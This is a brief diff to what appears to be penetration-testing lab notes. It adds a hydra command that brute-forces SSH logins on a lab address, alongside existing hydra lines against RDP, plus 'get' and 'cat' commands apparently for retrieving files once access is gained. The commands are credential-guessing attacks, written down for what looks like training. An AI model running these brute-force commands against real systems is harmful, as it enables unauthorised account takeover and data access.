@@ -91,6 +91,11 @@ hydra -L Usernames.txt -P Passwords.txt 10.10.1.11 rdp
 
 # Alternate hydra syntax
 hydra -l Administrator -P passwords.txt rdp://10.10.1.11 -t 4 -f -V
+hydra -L path to wordlist -P path to wordlist ssh://10.10.1.11
+
+get filename
+cat filename
+
 ```
 
 ---
